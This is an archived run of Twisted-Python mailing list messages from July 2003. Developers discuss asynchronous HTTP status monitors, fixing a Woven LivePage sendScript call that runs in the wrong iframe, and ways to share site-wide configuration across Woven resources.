From michal at sabren.com  Thu Jul 17 10:28:49 2003
From: michal at sabren.com (Michal Wallace)
Date: Thu, 17 Jul 2003 10:28:49 -0400 (EDT)
Subject: [Twisted-Python] How Twisted is This?
In-Reply-To: <20030716172440.GA20186@xdsk200>
Message-ID: <Pine.LNX.4.44.0307171023060.27933-100000@hydrogen.sabren.com>

On Wed, 16 Jul 2003, Brad Bollenbach wrote:

> Well, I'm sure I mean I want to block.
> 
> Unless I don't (in which case Twisted would have to prove to me that I
> don't).
> 
> Here's an example use case for a monitoring check:
> 
> 1. open web page and store cookie that it gives us
> 2. did we get the page ok? (yes)
> 3. submit the form with values foo=bar and baz=spam (and the cookie we 
> got in step 1)
> 4. did the response get retrieved ok? (yes)
> 5. is the string "Welcome to blah blah blah" present in this page? (no)
> 6. return a "NOT OK" for this monitor


Hmm. I run a site that monitors several hundred web pages 
every hour. I'd have to agree that blocking isn't the best
choice. 

What if the site is down? Or for some reason is really
slow? And it takes several minutes to fetch each page?
Then 5 minutes later, your monicron tool fires up again,
but the first one isn't even finished, and so on. Pretty
soon your server has 2039482304 python instances in memory.

If you're using a timeoutsocket, you might be okay, but 
even then a few timeouts in a row can make your execution
time needlessly long.


Sincerely,
 
Michal J Wallace
Sabren Enterprises, Inc.
-------------------------------------
contact: michal at sabren.com
hosting: http://www.cornerhost.com/
my site: http://www.withoutane.com/
--------------------------------------





From brad at bbnet.ca  Thu Jul 17 16:30:15 2003
From: brad at bbnet.ca (Brad Bollenbach)
Date: Thu, 17 Jul 2003 16:30:15 -0400
Subject: [Twisted-Python] Simplifying my StatusMonitor
Message-ID: <20030717203015.GA24175@xdsk200>

Hi,

Okay, in the usual XP fashion, I'm doing a spike to assess two use cases
for Twisted:

1. Writing a simple monitor that checks the status of a response, to see
what it's like to write a foobar in Twisted.

2. How to schedule multiple monitor batches so they can run and report
back to a "central command" (maybe CentralCommand or something), which
can then determine whether or not (and to whom) an error report should
be sent. (I've scrapped the idea of a "monicron")

I did #1 this morning. It's 49 lines of Python, in what would have
otherwise been less than five of "normal", blocking code:

==== begin code ====

#!/usr/bin/python2.2

from twisted.web import client

class HTTPPageStatusGetter(client.HTTPPageGetter):
    """A getter that tells clients the status of a response"""
    
    def handleStatus(self, version, status, message):
        client.HTTPPageGetter.handleStatus(self, version, status, message)
        self.factory.status(status)

class StatusMonitorFactory(client.HTTPClientFactory):
    """An HTTP Monitor that does something interesting with the
    HTTP status returned."""

    protocol = HTTPPageStatusGetter

    def page(self, page):
        pass

    def noPage(self, reason):
        pass
        
    def status(self, status):
        if self.waiting:
            self.waiting = 0
            self.deferred.callback(status)
    
class StatusMonitor:
    def checkFor200OK(self, url):
        host, port, url = client._parse(url)
        factory = StatusMonitorFactory(host, url)
        reactor.connectTCP(host, port, factory)
        factory.deferred.addCallback(self.gotStatus, url)
        factory.deferred.addErrback(self.reportError, url)
        return factory.deferred

    def gotStatus(self, status, url):
        print "hooray, got status %s" % status

    def reportError(self, failure, url):
        print ":( There was a problem in %s" % url
        print failure

from twisted.internet import reactor

d = StatusMonitor().checkFor200OK('http://www.bbnet.ca/')
d.addCallback(lambda *a: reactor.stop())
reactor.run()

==== end code ====

How could I have made this simpler? What approach would you have taken
to solve this problem?

--
Brad Bollenbach
BBnet.ca



From lists at gregfortune.com  Thu Jul 17 19:11:36 2003
From: lists at gregfortune.com (Greg Fortune)
Date: Thu, 17 Jul 2003 16:11:36 -0700
Subject: [Twisted-Python] How Twisted is This?
In-Reply-To: <20030717095529.GB2302@lapdog>
References: <3F15BB31.27794375@engcorp.com> <50E4C45B-B7DE-11D7-8336-000A95686CD8@redivi.com> <20030717095529.GB2302@lapdog>
Message-ID: <200307171611.36714.lists@gregfortune.com>

On Thursday 17 July 2003 02:55 am, Tommi Virtanen wrote:
> On Wed, Jul 16, 2003 at 06:39:09PM -0400, Bob Ippolito wrote:
> > watch out for when writing a web spider, for example.  It just doesn't
> > make sense to intentionally design something that behaves like:
> > ______/\___________/\_____ when you really have an extremely
> > parallelizable task at hand.  Checking site A is in no way dependent on
> > checking site B, so there's no reason to intentionally make them happen
> > at the same time if you know better.  We're not talking about a whole
> > lot of code here.  Leveraging the fact that 99% of what needs to be
> > done is glue code between stuff that's already in twisted, a prototype
> > of his application could be easily be done in less than fifty lines
> > using the scalable approach.  In fact, I think that the "wake up and do
> > stuff every N minutes" approach would actually end up being a longer
> > and easier to screw up implementation.
>
> 	You all should probably read up on what the Nagios project
> 	thinks about randomizing monitoring intervals. They have a
> 	stable open source product that can scale reasonably well,
> 	and have good opinions on that subject.

I'm pretty sure no one is talking about randomizing...  One solution is a 
fixed interval check and the other is a "as needed" check.  The only ways I 
can imagine that a "as needed" check would be more costly is if the monitors 
were queued very frequently and the controller ended up waking up/sleeping 
very very short intervals or if a huge number of monitors were queued with 
start times far into the future and the controller took a long time to search 
the list for the next pending monitor.  An intelligent insertion routine 
could solve the second issue easily and if a five minute check is sufficient, 
I can't imagine the first issue being a problem...


btw, I couldn't find that doc with a quick look at http://www.nagios.org/.  Do 
you have a direct link 'cause I'm curious regardless :)

Greg




From tim.andrews at adpro.com.au  Thu Jul 17 20:37:23 2003
From: tim.andrews at adpro.com.au (Tim Andrews)
Date: Fri, 18 Jul 2003 10:07:23 +0930
Subject: [Twisted-Python] Woven LivePage sendScript works with some scripts but not others
Message-ID: <MIEKLAIKJGMEAEJNJKJAKEAACBAA.tim.andrews@adpro.com.au>

Hi twisted,

I'm trying to use LivePage to send some script to a web page.

All works well if the script is as per the manual example, ie
sendScript("alert('Hello world!')")
will pop up a window as expected.

However, if i try a script like "document.all.fred.innerHTML='FRED'" I get
an error on the page "Error: document.all.fred is null or not an object". I
know the script is okay because if it is on the on the page it will work.

Any clues?

Thanks,

Tim


Some example code for your perusal ...


from twisted.web.woven import page, controller, interfaces

model = {
    'name': 'LivePage Handled Events',
    'link': 'http://link',
}

template = """
  <html>
   <body>
     <h3> Watch me change! </h3>
     <div id = "fred"> blah </div>
     <h3 model="name" view="Text"/>
     <div model="link" view="Link" controller="foo">mouse here won't work
:(</div>
     <span view="webConduitGlue" />
     <h3>Locally Handled Events</h3>
     <a href="http://link"
        onmouseover="document.all.fred.innerHTML='FRED'"
        onmouseout="document.all.fred.innerHTML='fred'">mouse here will work
:)
     </a>
   </body>
  </html>
"""

class fooController(controller.Controller):

  def handle(self, request):
    global currentPage
    currentPage = request.getSession(interfaces.IWovenLivePage)
    self.view.addEventHandler("onmouseover", self.foo_onMouseOver)
    self.view.addEventHandler("onmouseout", self.foo_onMouseOut)

  def foo_onMouseOver(self, request, widget):
    global currentPage
    print 'foo over'
    currentPage.sendScript("document.all.fred.innerHTML='FRED'") # :( this
doesn't work
    # currentPage.sendScript("alert('Hello world!')") # :) this works

  def foo_onMouseOut(self, request, widget):
    global currentPage
    print 'foo out'
    currentPage.sendScript("document.all.fred.innerHTML='fred'") # :( this
doesn't work

class fooPage(page.LivePage):

  def wcfactory_foo(self, request, node, model):
    return fooController(model)

resource = fooPage(model, template=template)




From bob at redivi.com  Thu Jul 17 20:44:14 2003
From: bob at redivi.com (Bob Ippolito)
Date: Thu, 17 Jul 2003 20:44:14 -0400
Subject: [Twisted-Python] How Twisted is This?
In-Reply-To: <200307171611.36714.lists@gregfortune.com>
Message-ID: <F44179D9-B8B8-11D7-8336-000A95686CD8@redivi.com>

On Thursday, Jul 17, 2003, at 19:11 America/New_York, Greg Fortune 
wrote:

> On Thursday 17 July 2003 02:55 am, Tommi Virtanen wrote:
>> On Wed, Jul 16, 2003 at 06:39:09PM -0400, Bob Ippolito wrote:
>>> watch out for when writing a web spider, for example.  It just 
>>> doesn't
>>> make sense to intentionally design something that behaves like:
>>> ______/\___________/\_____ when you really have an extremely
>>> parallelizable task at hand.  Checking site A is in no way dependent 
>>> on
>>> checking site B, so there's no reason to intentionally make them 
>>> happen
>>> at the same time if you know better.  We're not talking about a whole
>>> lot of code here.  Leveraging the fact that 99% of what needs to be
>>> done is glue code between stuff that's already in twisted, a 
>>> prototype
>>> of his application could be easily be done in less than fifty lines
>>> using the scalable approach.  In fact, I think that the "wake up and 
>>> do
>>> stuff every N minutes" approach would actually end up being a longer
>>> and easier to screw up implementation.
>>
>> 	You all should probably read up on what the Nagios project
>> 	thinks about randomizing monitoring intervals. They have a
>> 	stable open source product that can scale reasonably well,
>> 	and have good opinions on that subject.
>
> I'm pretty sure no one is talking about randomizing...  One solution 
> is a
> fixed interval check and the other is a "as needed" check.  The only 
> ways I
> can imagine that a "as needed" check would be more costly is if the 
> monitors
> were queued very frequently and the controller ended up waking 
> up/sleeping
> very very short intervals or if a huge number of monitors were queued 
> with
> start times far into the future and the controller took a long time to 
> search
> the list for the next pending monitor.  An intelligent insertion 
> routine
> could solve the second issue easily and if a five minute check is 
> sufficient,
> I can't imagine the first issue being a problem...

Randomizing events is a rather good way to prevent collisions.  
Ethernet, for example, uses randomized delays when a collision happens. 
  This is how it can work without the complications of passing a token 
around or what have you.  Random delays are also often used for 
cryptography (I believe OpenSSL does this now) to prevent a certain 
kind of attacks.  As you said, it's not something strictly necessary at 
all for this sort of application, unless a lot of events are queued to 
fire at the same time (which is the issue I brought up, originally).  
Imagine, for example, the application starts up with a database of 
40,000 hosts to check at a 5 minute interval.  If the application 
starts _all_ of them at the same time, you're going to see much worse 
performance than if it scheduled them all with some random offset.  The 
other thing is that it's rather easy to implement, especially with 
Twisted.

Also, switching between sleeping and waking up isn't the worst thing in 
the world - it means network activity is happening (or you're polling, 
which is silly).

-bob




From speno at isc.upenn.edu  Thu Jul 17 22:07:05 2003
From: speno at isc.upenn.edu (John P Speno)
Date: Thu, 17 Jul 2003 22:07:05 -0400
Subject: [Twisted-Python] Finding peers.
In-Reply-To: <50E0FAB5-B080-11D7-BA53-003065D61A3E@froup.com>
References: <16136.11049.63479.337891@frank.xprtcc.com> <50E0FAB5-B080-11D7-BA53-003065D61A3E@froup.com>
Message-ID: <20030718020705.GA4889@isc.upenn.edu>

On Mon, Jul 07, 2003 at 11:38:38PM +1000, Tim Allen wrote:
> DNS-SD (DNS based Service Discovery) is the easy part - it's just a  
> standard way of organising DNS records such that a set of DNS queries  
> can create a useful list of things to connect to. 'Implementing' DNS-SD  
> support is not at all difficult, providing there exists an API to  
> request PTR and SRV records, and providing you can add them to your DNS  
> server.

Besides the resolver in Twisted, I have also seen dnspython from
http://www.dnspython.com and I like it. It also does its own resolving
directly, like Twisted.



From dp at twistedmatrix.com  Thu Jul 17 22:56:19 2003
From: dp at twistedmatrix.com (Donovan Preston)
Date: Thu, 17 Jul 2003 19:56:19 -0700
Subject: [Twisted-Python] Woven LivePage sendScript works with some scripts but not others
In-Reply-To: <MIEKLAIKJGMEAEJNJKJAKEAACBAA.tim.andrews@adpro.com.au>
References: <MIEKLAIKJGMEAEJNJKJAKEAACBAA.tim.andrews@adpro.com.au>
Message-ID: <682260F0-B8CB-11D7-951E-000A95864FC4@twistedmatrix.com>

On Thursday, July 17, 2003, at 5:37PM, Tim Andrews wrote:

>
> Hi twisted,
>
> I'm trying to use LivePage to send some script to a web page.
>
> All works well if the script is as per the manual example, ie
> sendScript("alert('Hello world!')")
> will pop up a window as expected.
>
> However, if i try a script like "document.all.fred.innerHTML='FRED'" I 
> get
> an error on the page "Error: document.all.fred is null or not an 
> object". I
> know the script is okay because if it is on the on the page it will 
> work.
>
> Any clues?

This is *probably* because, with the version of LivePage you are 
currently using, the JavaScript is evaluated within the context of the 
Output IFrame. I'm not a regular in-browser javascript expert, but 
something like top.document.all.fred or parent.document.all.fred might 
work better for you.

By the way, if you are trying to do your own innerHTML setting, don't. 
Woven LivePage includes a cross-browser abstraction of this sort of 
in-browser DOM mutation. Just write your Widgets in a way that they 
will always render themselves the way you want them to based on the 
Model data and the state of the session. (For example, you could set 
session.color = 'blue' and it would be different from someone else who 
has session.color = 'green')

Then, use one of the MVC notification APIs to cause Woven to re-render 
your Widget and send the appropriate, abstract JavaScript to the 
browser:

someWidgetReference. modelChanged({'request': request})

or

someModelReference.notify({'request': request})


Why the hideous dictionary-with-the-request-in-it? Ancient historical 
reasons which are entirely irrelevant now. I will change it to simply 
take the request asap, but for now, just do that :-)

dp




From wari at home.wari.org  Thu Jul 17 23:42:04 2003
From: wari at home.wari.org (Wari Wahab)
Date: Fri, 18 Jul 2003 11:42:04 +0800
Subject: [Twisted-Python] Simplifying my StatusMonitor
In-Reply-To: <20030717203015.GA24175@xdsk200>
References: <20030717203015.GA24175@xdsk200>
Message-ID: <3F176C8C.1040303@home.wari.org>

Brad Bollenbach wrote:

>Okay, in the usual XP fashion, I'm doing a spike to assess two use cases
>for Twisted:
>
>1. Writing a simple monitor that checks the status of a response, to see
>what it's like to write a foobar in Twisted.
>[..snip..]
>I did #1 this morning. It's 49 lines of Python, in what would have
>otherwise been less than five of "normal", blocking code:
>[..snip code..]]
>How could I have made this simpler? What approach would you have taken
>to solve this problem?
>  
>
Although the code seems like a lot, but it looks like you've gained 
something that does not block. For example, you can check a few sites 
concurrently this way.

I changed the code a bit so that I get more interesting results out of 
it. And from the results, you see that the return of the status != the 
order you called it, which is the nature of the internet.
wari at minisync:~$ python testspike.py
Got request for http://www.bbnet.ca/
Got request for http://roughingit.wari.org/
Got request for http://www.yahoo.com/
Got request for http://www.twistedmatrix.com/
hooray, got status 200 for http://roughingit.wari.org/
hooray, got status 200 for http://www.twistedmatrix.com/
hooray, got status 200 for http://www.yahoo.com/
hooray, got status 200 for http://www.bbnet.ca/

The call I did is this:
StatusMonitor().checkFor200OK('http://www.bbnet.ca/')
StatusMonitor().checkFor200OK('http://roughingit.wari.org/')
StatusMonitor().checkFor200OK('http://www.yahoo.com/')
StatusMonitor().checkFor200OK('http://www.twistedmatrix.com/')
#d.addCallback(lambda *a: reactor.stop())
reactor.callLater(5, reactor.stop)

PS: To twisted developers, why can't I do
d = StatusMonitor().checkFor200OK('http://www.bbnet.ca/')
d.addCallback(StatusMonitor().checkFor200OK, 'http://www.yahoo.com')

The reactor will be stuck after the bbnet.ca call.




From tim.andrews at adpro.com.au  Fri Jul 18 00:25:19 2003
From: tim.andrews at adpro.com.au (Tim Andrews)
Date: Fri, 18 Jul 2003 13:55:19 +0930
Subject: [Twisted-Python] Woven LivePage sendScript works with some scripts but not others
In-Reply-To: <682260F0-B8CB-11D7-951E-000A95864FC4@twistedmatrix.com>
Message-ID: <MIEKLAIKJGMEAEJNJKJAEEABCBAA.tim.andrews@adpro.com.au>

> > I'm trying to use LivePage to send some script to a web page.
> >
> > All works well if the script is as per the manual example, ie
> > sendScript("alert('Hello world!')")
> > will pop up a window as expected.
> >
> > However, if i try a script like "document.all.fred.innerHTML='FRED'" I
> > get
> > an error on the page "Error: document.all.fred is null or not an
> > object". I
> > know the script is okay because if it is on the on the page it will
> > work.
> >
> > Any clues?
>
> This is *probably* because, with the version of LivePage you are
> currently using, the JavaScript is evaluated within the context of the
> Output IFrame. I'm not a regular in-browser javascript expert, but
> something like top.document.all.fred or parent.document.all.fred might
> work better for you.

Both of these work, thankyou.

>
> By the way, if you are trying to do your own innerHTML setting, don't.

I was just experimenting here as it more familiar territory.

> Woven LivePage includes a cross-browser abstraction of this sort of
> in-browser DOM mutation. Just write your Widgets in a way that they
> will always render themselves the way you want them to based on the
> Model data and the state of the session. (For example, you could set
> session.color = 'blue' and it would be different from someone else who
> has session.color = 'green')
>
> Then, use one of the MVC notification APIs to cause Woven to re-render
> your Widget and send the appropriate, abstract JavaScript to the
> browser:
>
> someWidgetReference. modelChanged({'request': request})
>
> or
>
> someModelReference.notify({'request': request})

Could you give me a few more hints here please.  I'm still trying to get my
head around Chapter 7 of "The Twisted Documentation".  Is there anything
else to read in conjunction or should I start wading through the code?

Thanks,

Tim

>
>
> Why the hideous dictionary-with-the-request-in-it? Ancient historical
> reasons which are entirely irrelevant now. I will change it to simply
> take the request asap, but for now, just do that :-)
>
> dp
>
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
>




From andrew-twisted at puzzling.org  Fri Jul 18 00:27:30 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Fri, 18 Jul 2003 14:27:30 +1000
Subject: [Twisted-Python] Simplifying my StatusMonitor
In-Reply-To: <3F176C8C.1040303@home.wari.org>
References: <20030717203015.GA24175@xdsk200> <3F176C8C.1040303@home.wari.org>
Message-ID: <20030718042729.GG7618@frobozz>

On Fri, Jul 18, 2003 at 11:42:04AM +0800, Wari Wahab wrote:
> 
> PS: To twisted developers, why can't I do
> d = StatusMonitor().checkFor200OK('http://www.bbnet.ca/')
> d.addCallback(StatusMonitor().checkFor200OK, 'http://www.yahoo.com')
> 
> The reactor will be stuck after the bbnet.ca call.

Probably because the first argument to a callback is the result of the
previous call back.  Perhaps this will do what you want:


d = StatusMonitor().checkFor200OK('http://www.bbnet.ca/')
d.addCallback(lambda result, url: StatusMonitor().checkFor200OK(url), 
              'http://www.yahoo.com')

-Andrew.




From oisin at enginesofcreation.ie  Fri Jul 18 07:27:24 2003
From: oisin at enginesofcreation.ie (Oisin Mulvihill)
Date: Fri, 18 Jul 2003 12:27:24 +0100
Subject: [Twisted-Python] help, my woven web app won't work on win32 but will on linux!
Message-ID: <3F17D99C.9000908@enginesofcreation.ie>

Hi,

I've produced a small model of my program which hightlights
the problem I'm having. Attached are two files main.py and
index.rpy. To run the web app run main and make sure index.rpy
is in the same directory. Then point your web browser to
http://localhost:20808

On linux I can click on the web buttons and the app works
fine. One windows (I'm using win2k) I simply get
"No Such Resource, File not found".

The button press issues a post and this shows up as the url
"http://localhost:20808/control?action=set_view&view=view1"

When you look at the MyPage class in index.rpy I have a
wchild_control method. This method is called on linux and
I then process the request and take the required action.

On windows the wchild_control method does not appear to be
called at all and I don't know why.

Can anyone shed any light on this problem?

Thanks,


om
-------------- next part --------------
An HTML attachment was scrubbed...
URL: http://twistedmatrix.com/pipermail/twisted-python/attachments/20030718/4e00556d/attachment.htm 
-------------- next part --------------
An embedded and charset-unspecified text was scrubbed...
Name: main.py
Url: http://twistedmatrix.com/pipermail/twisted-python/attachments/20030718/4e00556d/attachment.txt 

From brad at bbnet.ca  Fri Jul 18 09:31:15 2003
From: brad at bbnet.ca (Brad Bollenbach)
Date: Fri, 18 Jul 2003 09:31:15 -0400
Subject: [Twisted-Python] Simplifying my StatusMonitor
In-Reply-To: <3F176C8C.1040303@home.wari.org>
References: <20030717203015.GA24175@xdsk200> <3F176C8C.1040303@home.wari.org>
Message-ID: <20030718133115.GA26501@xdsk200>

On Fri, Jul 18, 2003 at 11:42:04AM +0800, Wari Wahab wrote:
> Brad Bollenbach wrote:
> 
> >Okay, in the usual XP fashion, I'm doing a spike to assess two use cases
> >for Twisted:
> >
> >1. Writing a simple monitor that checks the status of a response, to see
> >what it's like to write a foobar in Twisted.
> >[..snip..]
> >I did #1 this morning. It's 49 lines of Python, in what would have
> >otherwise been less than five of "normal", blocking code:
> >[..snip code..]]
> >How could I have made this simpler? What approach would you have taken
> >to solve this problem?
> > 
> >
> Although the code seems like a lot, but it looks like you've gained 
> something that does not block. For example, you can check a few sites 

I don't buy this. I'd sooner take 45 fewer lines of code that /do/
block, and add 3 more lines to make it run in a thread. This is just a
basic test, I shudder to think at the complexity that would be added to
monitor complex transactions.

However, I'm not saying that I don't like Twisted, I'm saying there must
be a better way, and I want those in the know to show me what I'm doing
wrong. :)

> concurrently this way.
> 
> I changed the code a bit so that I get more interesting results out of 
> it. And from the results, you see that the return of the status != the 
> order you called it, which is the nature of the internet.
> wari at minisync:~$ python testspike.py
> Got request for http://www.bbnet.ca/
> Got request for http://roughingit.wari.org/
> Got request for http://www.yahoo.com/
> Got request for http://www.twistedmatrix.com/
> hooray, got status 200 for http://roughingit.wari.org/
> hooray, got status 200 for http://www.twistedmatrix.com/
> hooray, got status 200 for http://www.yahoo.com/
> hooray, got status 200 for http://www.bbnet.ca/
> 
> The call I did is this:
> StatusMonitor().checkFor200OK('http://www.bbnet.ca/')
> StatusMonitor().checkFor200OK('http://roughingit.wari.org/')
> StatusMonitor().checkFor200OK('http://www.yahoo.com/')
> StatusMonitor().checkFor200OK('http://www.twistedmatrix.com/')
> #d.addCallback(lambda *a: reactor.stop())
> reactor.callLater(5, reactor.stop)

I'm very new to Twisted (I'm only 48 hours old in Twisted-time), but I
think you meant to use a DeferredList here. At any rate, this code
doesn't make things any simpler, which is what I'm really after (lazy,
impatience and all that).

--
Brad Bollenbach
BBnet.ca



From mesozoic at polynode.com  Fri Jul 18 12:44:22 2003
From: mesozoic at polynode.com (mesozoic)
Date: Fri, 18 Jul 2003 16:44:22 +0000
Subject: [Twisted-Python] Accessing app-wide data in Woven
Message-ID: <20030718164422.GC7740@perpetual.moxn.net>

I am writing a Woven app that I would like to make fairly configurable by
the end-user without asking them to change my code. The way I'm doing this
now is with a special class, SiteConfiguration, that is given various data
in the root-level .rpy.

Now, every Page, every Model, and every View should (in my perfect world) be
able to get at this class. There should be only one SiteConfiguration; I'd
like to avoid calling it "global", because I know that word means many
different things. So what I do in my .rpy is:

 cfg = SiteConfiguration(...)
 registry.setComponent(SiteConfiguration, cfg)
 
Then, my site's static.File class sets 'child.registry = self.registry' and
'child.model.registry = self.registry' on everything it returns from
getChild. My Model classes then do some funkiness to find their top-level
parent and get the registry from that; I imagine my Pages could do the same.

But this seems a bit kludgish to me; I'm wondering if there is a more
general way of doing this that would not involve changing the behavior of
static.File.getChild.

Ideas?

-- 
Alex Levy
WWW: http://mesozoic.geecs.org
 
"Never let your sense of morals prevent you from doing what is right."
 -- Salvor Hardin, Isaac Asimov's _Foundation_



From radix at twistedmatrix.com  Fri Jul 18 13:16:20 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Fri, 18 Jul 2003 13:16:20 -0400
Subject: [Twisted-Python] Accessing app-wide data in Woven
In-Reply-To: <20030718164422.GC7740@perpetual.moxn.net>
References: <20030718164422.GC7740@perpetual.moxn.net>
Message-ID: <20030718171620.GE1149@radii>

On Fri, Jul 18, 2003 at 04:44:22PM +0000, mesozoic wrote:
> I am writing a Woven app that I would like to make fairly configurable by
> the end-user without asking them to change my code. The way I'm doing this
> now is with a special class, SiteConfiguration, that is given various data
> in the root-level .rpy.
...
>  cfg = SiteConfiguration(...)
>  registry.setComponent(SiteConfiguration, cfg)

I wouldn't even use the registry at all; you can just give the
resource you create in that .rpy access to the SiteConfiguration
instance, and it can do whatever it wants with it.

-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From itamar at itamarst.org  Fri Jul 18 13:28:21 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Fri, 18 Jul 2003 13:28:21 -0400
Subject: [Twisted-Python] Accessing app-wide data in Woven
In-Reply-To: <20030718164422.GC7740@perpetual.moxn.net>
References: <20030718164422.GC7740@perpetual.moxn.net>
Message-ID: <20030718132821.71334711.itamar@itamarst.org>

Define a marker interface ISiteConfiguration.

The top-level RPY does:

    request.setComponent(ISiteConfiguration, myConfig)

And then any lower-level Resource can do:

    myConfig = ISiteConfiguration(request)




From m at moshez.org  Fri Jul 18 13:35:37 2003
From: m at moshez.org (Moshe Zadka)
Date: 18 Jul 2003 17:35:37 -0000
Subject: [Twisted-Python] Accessing app-wide data in Woven
In-Reply-To: <20030718171620.GE1149@radii>
References: <20030718171620.GE1149@radii>, <20030718164422.GC7740@perpetual.moxn.net>
Message-ID: <20030718173537.18960.qmail@green.zadka.com>

On Fri, 18 Jul 2003, Christopher Armstrong <radix at twistedmatrix.com> wrote:

> On Fri, Jul 18, 2003 at 04:44:22PM +0000, mesozoic wrote:
> > I am writing a Woven app that I would like to make fairly configurable by
> > the end-user without asking them to change my code. The way I'm doing this
> > now is with a special class, SiteConfiguration, that is given various data
> > in the root-level .rpy.
> ...
> >  cfg = SiteConfiguration(...)
> >  registry.setComponent(SiteConfiguration, cfg)
> 
> I wouldn't even use the registry at all; you can just give the
> resource you create in that .rpy access to the SiteConfiguration
> instance, and it can do whatever it wants with it.

Including giving it to its children, in some way or another...
[Possibilities are endless, from overriding putChild to overriding
getChildWithDefault -- since we have no idea how the rest of
your code looks like, its hard to make any specific replies...]
-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From radix at twistedmatrix.com  Fri Jul 18 13:58:53 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Fri, 18 Jul 2003 13:58:53 -0400
Subject: [Twisted-Python] Accessing app-wide data in Woven
In-Reply-To: <20030718132821.71334711.itamar@itamarst.org>
References: <20030718164422.GC7740@perpetual.moxn.net> <20030718132821.71334711.itamar@itamarst.org>
Message-ID: <20030718175853.GF1149@radii>

On Fri, Jul 18, 2003 at 01:28:21PM -0400, Itamar Shtull-Trauring wrote:
> Define a marker interface ISiteConfiguration.
> 
> The top-level RPY does:
> 
>     request.setComponent(ISiteConfiguration, myConfig)

well, the request isn't available in the rpy, only in the methods of
the resource it returns


-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From itamar at itamarst.org  Fri Jul 18 14:12:11 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Fri, 18 Jul 2003 14:12:11 -0400
Subject: [Twisted-Python] Accessing app-wide data in Woven
In-Reply-To: <20030718175853.GF1149@radii>
References: <20030718164422.GC7740@perpetual.moxn.net>
	<20030718132821.71334711.itamar@itamarst.org>
	<20030718175853.GF1149@radii>
Message-ID: <20030718141211.41967a09.itamar@itamarst.org>

On Fri, 18 Jul 2003 13:58:53 -0400
Christopher Armstrong <radix at twistedmatrix.com> wrote:

> > The top-level RPY does:
> > 
> >     request.setComponent(ISiteConfiguration, myConfig)
> 
> well, the request isn't available in the rpy, only in the methods of
> the resource it returns

You'd set it in the rpy's resource's getChild, probably.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From dp at twistedmatrix.com  Fri Jul 18 14:28:46 2003
From: dp at twistedmatrix.com (Donovan Preston)
Date: Fri, 18 Jul 2003 11:28:46 -0700
Subject: [Twisted-Python] Accessing app-wide data in Woven
In-Reply-To: <20030718141211.41967a09.itamar@itamarst.org>
References: <20030718164422.GC7740@perpetual.moxn.net> <20030718132821.71334711.itamar@itamarst.org> <20030718175853.GF1149@radii> <20030718141211.41967a09.itamar@itamarst.org>
Message-ID: <AAFF6EEA-B94D-11D7-951E-000A95864FC4@twistedmatrix.com>

On Friday, July 18, 2003, at 11:12AM, Itamar Shtull-Trauring wrote:

> On Fri, 18 Jul 2003 13:58:53 -0400
> Christopher Armstrong <radix at twistedmatrix.com> wrote:
>
>>> The top-level RPY does:
>>>
>>>     request.setComponent(ISiteConfiguration, myConfig)

This is precisely why I made the resource Componentized. It's far more 
convenient and less error-prone to do this than to attempt to make sure 
that a reference to your Configuration object is passed to every single 
child in your system.

>> well, the request isn't available in the rpy, only in the methods of
>> the resource it returns

Maybe it should be. I suppose that makes it possible for people to 
confuse an rpy with a cgi-like thing and write epy like scripts though. 
Maybe it's just an education issue.

> You'd set it in the rpy's resource's getChild, probably.

Unfortunately you have to set it both in getChild and render on the 
root if you want to ensure it is always available. Slightly 
inconvenient.

dp




From glyph at twistedmatrix.com  Fri Jul 18 16:58:14 2003
From: glyph at twistedmatrix.com (Glyph Lefkowitz)
Date: Fri, 18 Jul 2003 15:58:14 -0500
Subject: [Twisted-Python] Accessing app-wide data in Woven
In-Reply-To: <AAFF6EEA-B94D-11D7-951E-000A95864FC4@twistedmatrix.com>
Message-ID: <8C4DD295-B962-11D7-953B-000393C9700E@twistedmatrix.com>

On Friday, July 18, 2003, at 01:28 PM, Donovan Preston wrote:

> This is precisely why I made the resource Componentized. It's far more 
> convenient and less error-prone to do this than to attempt to make 
> sure that a reference to your Configuration object is passed to every 
> single child in your system.

While I agree that it's better to use a component on the resource than 
to randomly set a junk attribute, I'd also like to caution against 
using this too much.  Unless you're doing something like computing 
relative links, it's a lot safer and less surprising to explicitly pass 
references around in your application.  This might involve more typing, 
but trying to "throw" objects to other parts of your application, using 
the registry, the Componentized request, or the session makes it 
dependent upon an execution context.  That context is often present, 
but it's an undeclared requirement, so it can be a very surprising 
impediment to using a particular kind of resource from some other code 
that does a related but not identical thing.




From radix at twistedmatrix.com  Fri Jul 18 17:05:57 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Fri, 18 Jul 2003 17:05:57 -0400
Subject: [Twisted-Python] Accessing app-wide data in Woven
In-Reply-To: <8C4DD295-B962-11D7-953B-000393C9700E@twistedmatrix.com>
References: <AAFF6EEA-B94D-11D7-951E-000A95864FC4@twistedmatrix.com> <8C4DD295-B962-11D7-953B-000393C9700E@twistedmatrix.com>
Message-ID: <20030718210557.GG1149@radii>

On Fri, Jul 18, 2003 at 03:58:14PM -0500, Glyph Lefkowitz wrote:
> 
> On Friday, July 18, 2003, at 01:28 PM, Donovan Preston wrote:
> 


I'm pretty sure that there was a freak double-thinko by both glyph and
dovonan here: s/resource/request/ for the marked instances:

> >This is precisely why I made the resource Componentized. It's far more 
                                    ^^^^^^^^ make that request
> >convenient and less error-prone to do this than to attempt to make 
> >sure that a reference to your Configuration object is passed to every 
> >single child in your system.
> 
> While I agree that it's better to use a component on the resource than 
                                                           ^^^^^^^^ here too
> to randomly set a junk attribute, I'd also like to caution against 
> using this too much.  Unless you're doing something like computing 
> relative links, it's a lot safer and less surprising to explicitly pass 
